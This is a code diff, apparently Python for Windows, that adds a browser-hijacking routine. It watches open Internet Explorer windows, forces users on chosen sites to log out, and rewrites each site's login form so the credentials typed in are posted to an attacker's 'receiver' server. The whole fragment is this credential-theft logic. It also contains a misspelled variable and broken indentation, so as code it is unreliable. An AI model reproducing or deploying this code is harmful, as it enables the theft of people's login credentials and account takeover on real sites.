@@ -31,3 +31,35 @@ target_sites = ()
       while True:
           for browser in windows:
               url = urlparse.urlparse(browser.LocationUrl)
+
+              if url.hostname in target_sites:
+                  if target_sites[url.hostname]["owned"]:
+                      continue
+
+              if target_sites[url.hostname]["logout_url"]:
+                  browser.Navigate(target_sites[url.hostname]["logout_url"])
+                  wait_for_browser(browser)
+
+              else:
+
+                  full_doc = browser.Document.all
+
+                  for i in full_doc:
+                      try:
+                          if i.id == taregt_sites[url.hostname]["logout_form"]:
+                              i.submit()
+                              wait_for_browser(browser)
+                      except:
+                          pass
+
+             try:
+                 login_index = target_sites[url.hostname]["login_form_index"]
+                 login_page  = urllib.quote(browser.LocationUrl)
+                 browser.Document.forms[login_index].action = "%s%s" % (data_.receiver,
+                         login_page)
+                 target_sites[url.hostname]["owned"] = True
+
+            except:
+                pass
+
+    time.sleep(5)
